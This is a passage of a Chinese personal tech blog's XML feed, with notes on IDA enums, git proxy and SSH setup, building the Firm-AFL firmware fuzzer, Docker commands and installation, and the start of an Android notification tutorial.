class="headerlink" title="参考文章"></a>参考文章</h1><ul><li>加密与解密</li><li>逆向工程核心原理</li></ul>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA使用</title>
    <link href="/2023/06/07/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <url>/2023/06/07/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="创建枚举类型"><a href="#创建枚举类型" class="headerlink" title="创建枚举类型"></a>创建枚举类型</h1><p>View-&gt;Open subviews-&gt;Enumerations</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230527223117697.png" alt="image-20230527223117697"></p><p>右键-&gt;add enum</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230527223346762.png" alt="image-20230527223346762"></p><p>输入枚举名以及宽度</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230527223420229.png" alt="image-20230527223420229"></p><p>右键-&gt;add enum member</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230527223447861.png" alt="image-20230527223447861"></p><p>右键-&gt;Field type-&gt;Enum member</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230527224640913.png" alt="image-20230527224640913"></p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git使用</title>
    <link href="/2023/06/07/git%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/06/07/git%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h1><p>参考<a href="https://blog.csdn.net/qq_34147601/article/details/118305793">Git设置代理</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//设置全局代理</span><br><span class="hljs-comment">//http</span><br>git config <span class="hljs-attr">--global</span> https<span class="hljs-selector-class">.proxy</span> http:<span class="hljs-comment">//127.0.0.1:1080</span><br><span class="hljs-comment">//https</span><br>git config <span class="hljs-attr">--global</span> https<span class="hljs-selector-class">.proxy</span> https:<span class="hljs-comment">//127.0.0.1:1080</span><br><span class="hljs-comment">//使用socks5代理的 例如ss，ssr 1080是windows下ss的默认代理端口,mac下不同，或者有自定义的，根据自己的改</span><br>git config <span class="hljs-attr">--global</span> http<span class="hljs-selector-class">.proxy</span> socks5:<span class="hljs-comment">//127.0.0.1:1080</span><br>git config <span class="hljs-attr">--global</span> https<span class="hljs-selector-class">.proxy</span> socks5:<span class="hljs-comment">//127.0.0.1:1080</span><br><br><span class="hljs-comment">//只对github.com使用代理，其他仓库不走代理</span><br>git config <span class="hljs-attr">--global</span> http<span class="hljs-selector-class">.https</span>:<span class="hljs-comment">//github.com.proxy socks5://127.0.0.1:1080</span><br>git config <span class="hljs-attr">--global</span> https<span class="hljs-selector-class">.https</span>:<span class="hljs-comment">//github.com.proxy socks5://127.0.0.1:1080</span><br><span class="hljs-comment">//取消github代理</span><br>git config <span class="hljs-attr">--global</span> <span class="hljs-attr">--unset</span> http<span class="hljs-selector-class">.https</span>:<span class="hljs-comment">//github.com.proxy</span><br>git config <span class="hljs-attr">--global</span> <span class="hljs-attr">--unset</span> https<span class="hljs-selector-class">.https</span>:<span class="hljs-comment">//github.com.proxy</span><br><br><span class="hljs-comment">//取消全局代理</span><br>git config <span class="hljs-attr">--global</span> <span class="hljs-attr">--unset</span> http<span class="hljs-selector-class">.proxy</span><br>git config <span class="hljs-attr">--global</span> <span class="hljs-attr">--unset</span> https.proxy<br></code></pre></td></tr></table></figure><h1 id="Github上传项目"><a href="#Github上传项目" class="headerlink" title="Github上传项目"></a>Github上传项目</h1><p>首先<code>New repository</code></p><p>填写项目信息创建仓库</p><p>上传项目的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">第一次上传</span><br>echo &quot;# test&quot; &gt;&gt; README.md<br>git init<br>git add README.md<br>git commit -m &quot;first commit&quot;<br>git branch -M main<br>git remote add origin git@github.com:h0pe-ay//*****..git<br>git push -u origin main<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">后面几次上传</span><br>git remote add origin git@github.com:h0pe-ay/*****.git<br><span class="hljs-meta prompt_">#</span><span class="language-bash">git branch -M main</span><br>git branch -f main HEAD<br>git push -u origin main<br></code></pre></td></tr></table></figure><h1 id="更新项目"><a href="#更新项目" class="headerlink" title="更新项目"></a>更新项目</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git add *<br>git commit -m &quot;&quot;<br>git branch -f main HEAD<br>git push -u origin main<br>git push origin master -f<br></code></pre></td></tr></table></figure><h1 id="生成ssh-key"><a href="#生成ssh-key" class="headerlink" title="生成ssh key"></a>生成ssh key</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">生成ssh key</span><br>ssh-keygen -t rsa -C &quot;youremail@example.com<br></code></pre></td></tr></table></figure><p>在C盘-&gt;用户名-&gt;<code>.ssh</code>文件夹下有个<code>id_rsa.pub</code>文件复制到<code>github</code>设置中<code>SSH and GPG keys</code>-&gt;<code>New SSH key</code>中</p><h1 id="push超时"><a href="#push超时" class="headerlink" title="push超时"></a>push超时</h1><p>参考文章<a href="https://blog.csdn.net/yunxiaobaobei/article/details/123474599">git报错ssh: connect to host github.com port 22: Connection timed out</a></p><ul><li>C盘-&gt;用户名-&gt;<code>.ssh</code>文件夹下创建<code>config</code>文件添加如下信息</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">Host github.com<br>User YourEmail<br>Hostname ssh.github.com<br>PreferredAuthentications publickey<br>IdentityFile ~/.ssh/id_rsa<br>Port 443<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Firm-AFL</title>
    <link href="/2023/06/07/Firm-AFL%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/06/07/Firm-AFL%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Firm-AFL"><a href="#Firm-AFL" class="headerlink" title="Firm-AFL"></a>Firm-AFL</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>Firm-AFL</code>是一款用于对物联网固件进行模糊测试的工具，该工具通过增强进程仿真促进测试效率，拥有QEMU系统仿真与用户模式仿真的优点。更多技术细节可以去查阅论文。</p><p><code>Firm-AFL</code>所依赖的环境较多，搭建起来复杂，因此记录一下搭建<code>Firm-AFL</code>的细节。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li><p>首先下载<code>Firm-AFL</code>，<code>git clone https://github.com/zyw-200/FirmAFL.git</code></p></li><li><p>编译全系统仿真以及用户模式仿真的文件</p><ul><li><p>User mode</p><ul><li><pre><code class="shell">cd user_mode/./configure --target-list=mipsel-linux-user,mips-linux-user,arm-linux-user --static --disable-werrormake<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><br>- <span class="hljs-keyword">System</span> mode<br><br>  - ```<span class="hljs-built_in">shell</span><br>    cd qemu_mode/DECAF_qemu_2<span class="hljs-number">.10</span>/<br>    ./configure --target-list=mipsel-softmmu,mips-softmmu,arm-softmmu --<span class="hljs-keyword">disable</span>-werror<br>    <span class="hljs-built_in">make</span><br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul></li><li><p>安装<code>firmadyne</code></p><ul><li><p>安装依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan<br></code></pre></td></tr></table></figure></li><li><p>下载项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone --recursive https://github.com/firmadyne/firmadyne.git<br></code></pre></td></tr></table></figure></li></ul></li><li><p>安装<code>binwalk</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/ReFirmLabs/binwalk.git<br>cd binwalk<br>sudo ./deps.sh<br>sudo python ./setup.py install<br>For Python 2.x, sudo apt-get install python-lzma<br>sudo -H pip install git+https://github.com/ahupp/python-magic<br>sudo -H pip install git+https://github.com/sviehb/jefferson.<br></code></pre></td></tr></table></figure></li><li><p>配置<code>frimadyne</code>数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install postgresql<br>sudo -u postgres createuser -P firmadyne, #密码为firmadyne，创建用户<br>sudo -u postgres createdb -O firmadyne firmware #创建数据库<br><br>xz -d data.xz #作者提供的数据库文件<br>mv  data /firmadyne/database/schema<br>sudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema #导入数据库文件，这里需要采用作者给出的数据库文件<br></code></pre></td></tr></table></figure></li><li><p>通过<code>frimadyne</code>下载镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ./firmadyne/download.sh<br></code></pre></td></tr></table></figure></li><li><p>修改<code>frimadyne</code>的配置文件信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gedit ./firmadyne/firmadyne.config<br></code></pre></td></tr></table></figure><p>将注释删掉，并且填写自己<code>firmadyne</code>的路径</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221221152037290.png" alt="image-20221221152037290"></p></li><li><p>制作固件镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ./FrimAFL/firmadyne #这里的frimadyne是上面下载的项目<br>sudo python3 ./sources/extractor/extractor.py -b dlink -sql 127.0.0.1 -np -nk &quot;../firmware/DIR-815_FIRMWARE_1.01.ZIP&quot; images #提取镜像，提取的镜像放在了images文件夹下<br>sudo ./scripts/getArch.sh ./images/9050.tar.gz<br><span class="hljs-meta prompt_">#</span><span class="language-bash">这里作者修改了makeImage.sh脚本，因此采用作者的脚本</span><br>cp ./FrimAFL/firmadyne_modify/makeImage.sh ./FrimAFL/firmadyne/scripts<br>sudo ./scripts/makeImage.sh 9050<br>sudo ./scripts/inferNetwork.sh 9050<br>cd ..<br>python FirmAFL_setup.py 9050 mipsel<br></code></pre></td></tr></table></figure><p>此时镜像已经制作完毕，如下图</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221221152451038.png" alt="image-20221221152451038"></p></li><li><p>Fuzzing</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ./FrimAFL/image_9050<br><span class="hljs-meta prompt_">#</span><span class="language-bash">这里可以使用作者提供的启动文件</span><br>cp ./FrimAFL/FirmAFL_config/9050/run.sh ./FrimAFL/image_9050 <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">这里可以通过start.py直接完成仿真+模糊测试</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">python3 start.py</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">或者分步启动</span><br>sudo ./run.sh #开启仿真<br><br>python3 test.py#可以运行这个测试文件，判断仿真完毕没，这里需要主要偶的时候这个test.py是用python2写的，需要略微修改一下才能用python3启动<br><br>sudo ./user.sh #若test.py可以正常执行，则开始Fuziing<br></code></pre></td></tr></table></figure><ul><li>开始仿真</li></ul><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221221153545684.png" alt="image-20221221153545684"></p><ul><li>运行测试文件，判断仿真是否完成</li></ul><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221221153706991.png" alt="image-20221221153706991"></p><ul><li>仿真完成后就可以Fuzzing了</li></ul><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221221153820363.png" alt="image-20221221153820363"></p></li></ul><h1 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h1><p>1.缺少<code>autoreconf</code></p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221220160241561.png" alt="image-20221220160241561"></p><p>安装一下<code>autoerconf</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install autoconf<br></code></pre></td></tr></table></figure><p>2.<code>possibly undefined macro: AC_PROG_LIBTOOL</code></p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221220160448373.png" alt="image-20221220160448373"></p><p>安装一下<code>libtool</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install libtool<br></code></pre></td></tr></table></figure><p>3.找不到<code>-lbfd</code></p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221220162308501.png" alt="image-20221220162308501"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install binutils-dev<br></code></pre></td></tr></table></figure><p>4.缺少<code>boost.foreach.hpp</code>文件</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221220163351554.png" alt="image-20221220163351554"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install libboost-dev<br></code></pre></td></tr></table></figure><p>5.<code>libproxychains.so.3</code>出错</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221220172557925.png" alt="image-20221220172557925"></p><p>首先找到安装的路径<code>/usr/lib/x86_64-linux-gnu/libproxychains.so.3</code></p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221220172617556.png" alt="image-20221220172617556"></p><p><code>sudo gedit /usr/bin/proxychains</code>修改配置</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221220172539337.png" alt="image-20221220172539337"></p><p>7.could not be found for jpeg</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221220234813318.png" alt="image-20221220234813318"></p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt install libjpeg-<span class="hljs-built_in">dev</span> zlib1g-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/firmadyne/firmadyne">https://github.com/firmadyne/firmadyne</a></p><p><a href="https://github.com/zyw-200/FirmAFL">https://github.com/zyw-200/FirmAFL</a></p><p><a href="https://github.com/ReFirmLabs/binwalk">https://github.com/ReFirmLabs/binwalk</a></p><p><a href="https://blog.csdn.net/weixin_43695001/article/details/123486237">https://blog.csdn.net/weixin_43695001/article/details/123486237</a></p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker常用命令</title>
    <link href="/2023/06/07/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/06/07/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="记录Docker常用的命令"><a href="#记录Docker常用的命令" class="headerlink" title="记录Docker常用的命令"></a>记录Docker常用的命令</h1><h2 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a><strong>docker run</strong></h2><p>创建一个新的容器并运行一个命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]<br></code></pre></td></tr></table></figure><ul><li><strong>-d:</strong> 后台运行容器，并返回容器ID</li><li><strong>-i:</strong> 以交互模式运行容器</li><li><strong>-t:</strong> 为容器重新分配一个伪输入终端</li><li><strong>–name&#x3D;”nginx-lb”</strong></li><li><strong>-p:</strong> 指定端口映射，格式为：<strong>主机(宿主)端口:容器端口</strong></li><li><strong>–expose&#x3D;[]:</strong> 开放一个端口或一组端口</li></ul><h2 id="docker-exec"><a href="#docker-exec" class="headerlink" title="**docker exec **"></a>**docker exec **</h2><p>在运行的容器中执行命令</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">docker exec <span class="hljs-comment">[OPTIONS]</span> <span class="hljs-keyword">CONTAINER</span> COMMAND <span class="hljs-comment">[ARG...]</span><br></code></pre></td></tr></table></figure><ul><li>**-d :**分离模式: 在后台运行</li><li>**-i :**即使没有附加也保持STDIN 打开</li><li>**-t :**分配一个伪终端</li></ul><h2 id="docker-cp"><a href="#docker-cp" class="headerlink" title="docker cp"></a>docker cp</h2><p>用于容器与主机之间的数据拷贝</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">将主机/www/runoob目录拷贝到容器96f7f14e99ab的/www目录下</span><br>docker cp /www/runoob 96f7f14e99ab:/www/<br></code></pre></td></tr></table></figure><h2 id="批量删除镜像"><a href="#批量删除镜像" class="headerlink" title="批量删除镜像"></a>批量删除镜像</h2><h3 id="删除所有容器"><a href="#删除所有容器" class="headerlink" title="删除所有容器"></a>删除所有容器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rm [-f] $(docker ps -qa)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">根据容器的状态，删除Exited状态的容器</span><br>docker rm $(docker ps -qf status=exited)<br></code></pre></td></tr></table></figure><h3 id="删除所有镜像"><a href="#删除所有镜像" class="headerlink" title="删除所有镜像"></a>删除所有镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rmi [-f] $(docker images -qa)<br></code></pre></td></tr></table></figure><h3 id="按条件删除镜像"><a href="#按条件删除镜像" class="headerlink" title="按条件删除镜像"></a>按条件删除镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">没有打标签</span><br>docker rmi [-f] $(docker images -q | awk &#x27;/^&lt;none&gt;/ &#123; print $3 &#125;&#x27;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">镜像名包含关键字</span><br>docker rmi --force [-f] $(docker images | grep doss-api | awk &#x27;&#123;print $3&#125;&#x27;)  #其中doss-api为关键字<br></code></pre></td></tr></table></figure><h3 id="删除REPOSITORY、TAG为none的镜像（虚悬镜像）"><a href="#删除REPOSITORY、TAG为none的镜像（虚悬镜像）" class="headerlink" title="删除REPOSITORY、TAG为none的镜像（虚悬镜像）"></a>删除REPOSITORY、TAG为none的镜像（虚悬镜像）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">这类无标签镜像也被称为 虚悬镜像(dangling image) ，可以用下面的命令专门显示这类镜像：</span><br>docker image ls -f dangling=true<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">一般来说，虚悬镜像已经失去了存在的价值，是可以随意删除的，可以用下面的命令删除</span><br><br>docker rmi $(docker images -q -f dangling=true)<br></code></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.runoob.com/docker/docker-run-command.html">https://www.runoob.com/docker/docker-run-command.html</a></p><p><a href="https://blog.csdn.net/weixin_43702146/article/details/120701988">https://blog.csdn.net/weixin_43702146/article/details/120701988</a></p>]]></content>
    
    
    <categories>
      
      <category>Docker使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker安装</title>
    <link href="/2023/06/07/Docker%E5%AE%89%E8%A3%85/"/>
    <url>/2023/06/07/Docker%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>每次装新版本的<code>Ubuntu</code>时总要上网搜索一下<code>docker</code>安装命令，因此记录一下，免得以后找的时候不方便。</p><p>本文命令都是从<a href="https://zhuanlan.zhihu.com/p/143156163">如何在 Ubuntu 20.04 上安装和使用 Docker</a>抄下来的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt update<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装必要的依赖软件，来添加一个新的 HTTPS 软件源</span><br>sudo apt install apt-transport-https ca-certificates<br>curl gnupg-agent software-properties-common<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">导入源仓库的 GPG key</span><br>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">将 Docker APT 软件源添加到系统</span><br>sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装</span><br>sudo apt update<br>sudo apt install docker-ce docker-ce-cli containerd.io<br></code></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://zhuanlan.zhihu.com/p/143156163">https://zhuanlan.zhihu.com/p/143156163</a></p>]]></content>
    
    
    <categories>
      
      <category>Docker使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android第一行代码--多媒体</title>
    <link href="/2023/06/07/Android%E7%AC%AC%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81--%E8%BF%90%E7%94%A8%E6%89%8B%E6%9C%BA%E5%A4%9A%E5%AA%92%E4%BD%93/"/>
    <url>/2023/06/07/Android%E7%AC%AC%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81--%E8%BF%90%E7%94%A8%E6%89%8B%E6%9C%BA%E5%A4%9A%E5%AA%92%E4%BD%93/</url>
    
    <content type="html"><![CDATA[<h1 id="运用手机多媒体"><a href="#运用手机多媒体" class="headerlink" title="运用手机多媒体"></a>运用手机多媒体</h1><h2 id="通知-Notification"><a href="#通知-Notification" class="headerlink" title="通知(Notification)"></a>通知(Notification)</h2><p>创建通知的详细步骤</p><ul><li>首先需要一个<code>NotificationManager</code>对通知进行管理。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">NotificationManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> (NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);<br></code></pre></td></tr></table></figure><ul><li>接着使用<code>Builder</code>构造器来创建<code>Notification</code>对象</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Notification</span> <span class="hljs-variable">notification</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NotificationCompat</span>.Builder(context).build();<br></code></pre></td></tr></table></figure><ul><li>设置许多方法丰富<code>Notification</code>对象</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Notification</span> <span class="hljs-variable">notification</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NotificationCompat</span>.Builder(context)<br>    .setContentTile(<span class="hljs-string">&quot;This is content titile&quot;</span>)<span class="hljs-comment">//用于指定通知的标题内容</span><br>    .setContextText(<span class="hljs-string">&quot;This is content&quot;</span>)<span class="hljs-comment">//指定通知的正文内容</span><br>    .setWhen(System.currentTimeMillis())<span class="hljs-comment">//通知被创建的时间</span><br>    .setSmallIcon(R.drawable.small_icon)<span class="hljs-comment">//设置通知的小图标</span><br>    .setLargeIcon(BitmapFactory.decodeResource(getResources(),R.drawable.large_icon))<span class="hljs-comment">//设置通知的大图标</span><br>    .build();<br></code></pre></td></tr></table></figure><ul><li>使用<code>notify()</code>方法可以让通知显示出来<ul><li>参数一：<code>id</code>，保证每个通知所指定的<code>id</code>都是不同的</li><li>参数二：<code>Notification</code>对象</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">manager.notify(<span class="hljs-number">1</span>,notification);<br></code></pre></td></tr></table></figure><h3 id="NotificationTest"><a href="#NotificationTest" class="headerlink" title="NotificationTest"></a>NotificationTest</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>    <span class="hljs-keyword">switch</span> (v.getId())&#123;<br>        <span class="hljs-keyword">case</span> R.id.send_notice:<br>            <span class="hljs-type">NotificationManager</span> <span class="hljs-variable">notificationManager</span> <span class="hljs-operator">=</span> (NotificationManager) getSystemService(NOTIFICATION_SERVICE);<br>            <span class="hljs-type">Notification</span> <span class="hljs-variable">notification</span> 